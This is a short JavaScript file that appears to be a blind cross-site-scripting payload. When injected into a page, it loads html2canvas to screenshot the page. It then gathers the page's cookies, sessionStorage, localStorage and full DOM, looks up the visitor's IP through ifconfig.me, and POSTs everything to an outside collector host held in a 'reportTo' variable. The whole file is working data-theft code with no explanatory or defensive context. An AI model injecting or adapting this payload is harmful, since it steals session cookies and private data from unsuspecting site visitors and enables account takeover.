function sendReport(msg){
	document.documentElement.appendChild(s = document.createElement('script')).src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.js';
	s.onload = function() {
		html2canvas(document.documentElement,{
			onrendered: function (canvas){
		    		screenshot = encodeURIComponent(canvas.toDataURL());
		        	cookie = document.cookie;
		        	sstorage = encodeURIComponent(JSON.stringify(sessionStorage));
		        	lstorage = encodeURIComponent(JSON.stringify(localStorage));
				DOM = encodeURIComponent(document.documentElement.innerHTML);
				status = msg;
				var sr = new XMLHttpRequest();
				var body = 'report=1&screenshot=' + escape(screenshot) + '&cookie=' + cookie + '&sstorage=' + sstorage + '&lstorage=' + lstorage + '&dom=' + DOM + '&status=' + status + '&ip=' + ip
				sr.open('POST', reportTo, true);
				sr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
				sr.send(body);
				sr.onload = function(){
					/*alert(sr.responseText)*/
				}
			},
		});
	}
}

ipxhr = new XMLHttpRequest();
ipxhr.open('GET','https://ifconfig.me/ip');
ipxhr.onload = function(){
	window.ip = ipxhr.responseText
	sendReport('Inclusion');
}
ipxhr.send()
